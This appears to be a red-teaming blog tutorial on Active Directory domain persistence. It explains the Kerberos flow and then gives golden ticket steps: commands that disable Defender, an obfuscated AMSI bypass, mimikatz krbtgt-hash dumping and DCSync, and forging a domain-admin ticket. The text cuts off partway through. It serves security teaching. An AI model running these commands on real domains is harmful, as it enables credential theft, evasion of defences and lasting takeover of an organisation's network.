<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Active Directory - Domain Persistence" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-10T07:05:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Active Directory - Domain Persistence" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2024-03-22T16:01:03+05:30","datePublished":"2022-04-10T07:05:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Active Directory - Domain Persistence","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/"},"url":"https://0xstarlight.github.io/posts/Active-Directory-Domain-Persistence/"}</script><title>Active Directory - Domain Persistence | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Active Directory - Domain Persistence</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Active Directory - Domain Persistence</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1649554500" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-10 </em> </span> <span> Updated <em class="timeago" data-ts="1711103463" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-03-22 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3021 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/162562772-f1cf1862-cf6e-4b78-9017-e70c1f1801b9.png" alt="image" data-proofer-ignore></p><h1 id="introduction"><span style="color:lightblue">Introduction</span></h1><p>Welcome to my fifth article in the Red Teaming Series (Active Directory Domain Persistence). I hope everyone has gone through the previous articles of this series which go through the basic concepts required, high-level Domain enumeration explanation, AD/Windows Local Privilege escalation guide and AD Lateral Movement.</p><p>If not so, you can give it a read from <a href="https://0xstarlight.github.io/categories/red-teaming/">here</a>.</p><p>This guide explains Active-Directory Domain Persistence mainly by creating Golden tickets, Silver tickets, Skeleton Keys, DSRM and multiple ACL attacks in detail. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.</p><p>I will continue to update this article with new Domain Persistence Methods.</p><blockquote><h2 id="throughout-the-article-i-will-use-invoke-mimikatz-in-performing-the-persistence-on-a-windowsactive-directory-domain-if-any-other-tools-are-required-they-will-be-mentioned-at-the-end"><span class="mr-2">Throughout the article, I will use <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1"><span class="mr-2">Invoke-Mimikatz</a> in performing the persistence on a Windows/Active Directory Domain. If any other tools are required, they will be mentioned at the end.</span><a href="#throughout-the-article-i-will-use-invoke-mimikatz-in-performing-the-persistence-on-a-windowsactive-directory-domain-if-any-other-tools-are-required-they-will-be-mentioned-at-the-end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2></blockquote><h1 id="how-does-the-kerberos-system-work"><span style="color:lightblue">How does the kerberos system work?</span></h1><p><img data-src="https://user-images.githubusercontent.com/59029171/162563204-52b61852-9cd7-4ac6-99de-33c00350b86e.png" alt="image" data-proofer-ignore></p><p>Let’s break down every step from the above diagram and understand how the system and authentication occur between the host systems and the domain controller. I hope you already know the basic roles and functions in an Active Directory environment. With that, let’s begin.</p><h2 id="1-client-requests-a-tgt-from-kdc"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">1. Client Requests a TGT from KDC</span></span><a href="#1-client-requests-a-tgt-from-kdc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The privileged user wants to access a specific service from the application or Kerberos enabled server.<li>The user sends a timestamp to the KDC, which is encrypted and signed with the NTLM hash of the user’s password.<li>The following is required for the KDC to verify if the request is made from the user it claims to be.</ol><h2 id="2-kdc-sends-tgt-to-client"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">2. KDC sends TGT to Client</span></span><a href="#2-kdc-sends-tgt-to-client" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The KDC receives and decrypts the encrypted timestamp.<li>The KDC ensures the request comes from the user it claims to be and responds with a Ticket Granting Ticket(TGT) which can grant another ticket.<li>The sent TGT is encrypted and signed off with the NTML hash of the KRBTG, which is a particular account of the KDC only used for this purpose. This means the TGT can be only read and opened by the KRBTG.</ol><h2 id="3-client-requests-for-a-tgs"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">3. Client requests for a TGS</span></span><a href="#3-client-requests-for-a-tgs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The client receives the TGT, sends it back to the DC and requests a Ticket Granting Service(TGS) a service.<li>The KDC receives the TGS, decrypts it and does the following validation.<li>The <strong>only validation</strong> it does is whether it can decrypt the TGT or not. If possible, it assumes all the content inside the TGT is valid. This validation lasts up to <strong>20 minutes</strong> for any TGT request sent to the KDC.</ol><h2 id="4-kdc-sends-tgs-with-an-encrypted-session"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">4. KDC sends TGS with an encrypted session</span></span><a href="#4-kdc-sends-tgs-with-an-encrypted-session" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Once the TGT gets decrypted, the KDC responds with the TGS.<br /> Note: The KDC has no role other than Privilege role certificate(PRG)<li>The TGS sent from the KDC is encrypted with the NTML hash of the service the user requested from the application or Kerberos enabled server. This means the TGT can be only read and opened by the application server.</ol><h2 id="5-client-sends-service-ticket"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">5. Client sends service ticket</span></span><a href="#5-client-sends-service-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The client connects to the application server and presents the TGS it received from the KDC for its requested service.<li>As the TGS is encrypted with the service account’s NTML hash, it decrypts the TGS and then decides whether the user can access the service or not.</ol><h2 id="6-application-server-sends-the-timestamp-to-the-client"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">6. Application Server sends the timestamp to the client</span></span><a href="#6-application-server-sends-the-timestamp-to-the-client" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>The client receives the service it requested from the application server.<li>There is mutual authentication between the client and the application server so that a legit client doesn’t end up sending a TGS to a rouge application server.</ol><h3 id="important-points-to-keep-in-mind"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Important points to keep in mind</span></span><a href="#important-points-to-keep-in-mind" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>NTLM password hash for Kerberos RC4 encryption.<li>Logon Ticket (TGT) provides user auth to DC.<li>Kerberos policy only checked when TGT is created.<li>DC validates user account only when TGT &gt; 20 mins.<li>Service Ticket (TGS) PAC validation is optional &amp; rare. This is a validation check between the KDC and the application server directly.<ul><li>Server LSASS sends PAC Validation request to DC’s netlogon service (NRPC)<li>If it runs as a service, PAC validation is optional (disabled)<li>If a service runs as System, it performs server signature verification on the PAC (computer account long-term key).</ul></ul><p>Now, these are the steps of how a Kerberos system works typically. An attacker can abuse every step from the steps mentioned above to gain profit. I assume you have access to the Domain Controller and only require persistence. Since you understand how a Kerberos system works now, we can start on how to abuse these steps.</p><h1 id="golden-ticket"><span style="color:lightblue">Golden Ticket</span></h1><ul><li>We will be abusing the 3rd step in the Kerberos system with the help of a golden ticket.<li>A Golden Ticket is signed and encrypted by the hash of KRBTGT account which makes it a valid TGT ticket.<li>Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even deleted/revoked accounts.<li>The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.<li>Password change has no effect on this attack.</ul><h2 id="methodologysteps"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Get a Powershell session as a <strong>“domain admin”</strong> using <strong>“Over pass the hash”</strong> attack<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Create a <strong>New-PSSession</strong> attaching to the <strong>“domain controller”</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Enter the new session using <strong>Enter-PSSession</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Bypass the <em>AMSI</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Exit<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Load <strong>Mimikatz.ps1</strong> on the new session using <strong>Invoke-command</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />7. Enter the new session using <strong>Enter-PSSession</strong> <em>again</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />8. Now we can execute mimikatz on the DC<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />9. Keep note of <strong>krbtgt</strong> hash<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />10. Now go to any <strong>“non domain admin”</strong> account<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />11. Load <strong>Mimikats.ps1</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />12. Now we can create a ticket using the DC <strong>krbtgt</strong> hash<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />13. Now we can access any service on the DC. Example <strong><code class="language-plaintext highlighter-rouge">ls \\dc-corp\C$</code></strong> or<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PsExec64.exe</span><span class="w"> </span><span class="nx">\\adminsys.star.castle.local</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">star\adminsys</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">passwordhere</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></pre></table></code></div></div></ul><h2 id="invoke-mimikatz"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-disable-defender"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Disable Defender</span></span><a href="#1-disable-defender" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-amsi-bypass"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. AMSI bypass</span></span><a href="#2-amsi-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">sET-ItEM</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">'V'</span><span class="o">+</span><span class="s1">'aR'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'IA'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'blE:1q2'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'uZx'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">"{1}{O}"</span><span class="nt">-F</span><span class="s1">'F'</span><span class="p">,</span><span class="w"> </span><span class="s1">'rE'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">GeT-VariaBle</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"1Q2U"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"zX"</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="nt">-VaL_s</span><span class="o">+</span><span class="p">)</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="w">  </span><span class="s2">"{6}{3}{1}{4}{2}{@}{5}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'Util'</span><span class="p">,</span><span class="w"> </span><span class="s1">'A'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Amsi'</span><span class="p">,</span><span class="s1">'.Management.'</span><span class="p">,</span><span class="w"> </span><span class="s1">'utomation.'</span><span class="p">,</span><span class="s1">'s'</span><span class="p">,</span><span class="w"> </span><span class="s1">'System'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"g</span><span class="se">`e</span><span class="s2">tf</span><span class="se">`i</span><span class="s2">E1D"</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">"{O}{2}{1}"</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'amsi'</span><span class="p">,</span><span class="s1">'d'</span><span class="p">,</span><span class="s1">'InitFaile'</span><span class="w"> </span><span class="p">),(</span><span class="s2">"{2}{4}{O}{1}{3}"</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s1">'Stat'</span><span class="p">,</span><span class="s1">'i'</span><span class="p">,</span><span class="s1">'NonPubli'</span><span class="p">,</span><span class="s1">'c'</span><span class="p">,</span><span class="s1">'c,'</span><span class="w"> </span><span class="p">))</span><span class="o">.</span><span class="s2">"sE</span><span class="se">`T`V</span><span class="s2">aLUE"</span><span class="p">(</span><span class="nv">${n`ULl}</span><span class="p">,</span><span class="nv">${t`RuE}</span><span class="w"> </span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-execute-mimikatz-on-dc-as-da-to-get-krbtgt-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Execute mimikatz on DC as DA to get krbtgt hash</span></span><a href="#3-execute-mimikatz-on-dc-as-da-to-get-krbtgt-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer-name</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-create-a-ticket-on-any-machine--pass-the-ticket-attack-"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Create a ticket on any machine ( “pass the ticket” attack )</span></span><a href="#4-create-a-ticket-on-any-machine--pass-the-ticket-attack-" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /User:Administrator /domain:domain-name-goes-here /sid:sid-goes-here /krbtgt:hash-goes-here id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p><strong>/ptt</strong> : Inject the ticket in the current Powershell process/does not have the ticket on disk <strong>/ticket</strong> : Saves the ticket to a file for later use <strong>/startoffset</strong> : Put proper offset values according to the domain policy using <strong>(Get-DomainPolicy -domain moneycorp.local).”kerberos policy”</strong> else the session might get blocked/not created</p></div></blockquote><h3 id="5-list-kerberos-services-available"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. List Kerberos services available</span></span><a href="#5-list-kerberos-services-available" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">klist</span><span class="w">
</span></pre></table></code></div></div><h2 id="extra-commands"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Extra Commands</span></span><a href="#extra-commands" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="to-use-the-dcsync-feature-for-getting-krbtgt-hash-execute-the-below-command-with-da-privileges"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges</span></span><a href="#to-use-the-dcsync-feature-for-getting-krbtgt-hash-execute-the-below-command-with-da-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:dcorp\krbtgt"'</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC</p></div></blockquote><h3 id="using-ntml-hash-of-krbtgt-to-create-a-golden-ticket"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Using NTML hash of KRBTGT to create a Golden Ticket</span></span><a href="#using-ntml-hash-of-krbtgt-to-create-a-golden-ticket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Requires DA privs which can be done by used over-pass-the-hash to start a PowerShell session as domain admin.<li>Enter a PSSession to the domain controller and dump the hashes.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c"># Enter session</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer-name</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="c"># Bypass Protections</span><span class="w">
</span><span class="p">[</span><span class="n">star</span><span class="nt">-dc</span><span class="p">]:</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimemonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w"> 
</span><span class="p">[</span><span class="n">star</span><span class="nt">-dc</span><span class="p">]:</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableIOAVProtection</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span><span class="c"># exit PSRemote session</span><span class="w">
</span><span class="kr">exit</span><span class="w">
</span><span class="c"># Get the KRBTGT hash</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="o">.</span><span class="nx">\Invoke-Mimikatz.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="p">[</span><span class="n">star</span><span class="nt">-dc</span><span class="p">]:</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w">
</span><span class="p">[</span><span class="n">star</span><span class="nt">-dc</span><span class="p">]:</span><span class="n">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Mimikatz</span><span class="w">
</span></pre></table></code></div></div><ul><li>Now on any machine even if it is not part of the domain but can reach DC over network, we can use the information from the krbtgt hash to create a Golden Ticket.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#Note the admin SID</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView.ps1</span><span class="w">
</span><span class="nx">Get-DomainSID</span><span class="w"> </span><span class="nt">-Administrator</span><span class="w">
</span><span class="c">#Load the krbtgt hash</span><span class="w">
</span><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:domain-name-here /sid:admin-sid-here /krbtgt:krbtg-hash-here id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span><span class="w">
</span></pre></table></code></div></div><ul><li>Now we can explore the DC file system and execute WMI commands</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\star-dc\C</span><span class="err">$</span><span class="nx">\</span><span class="w">
</span><span class="n">gwmi</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_computersystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">star-dc</span><span class="w">
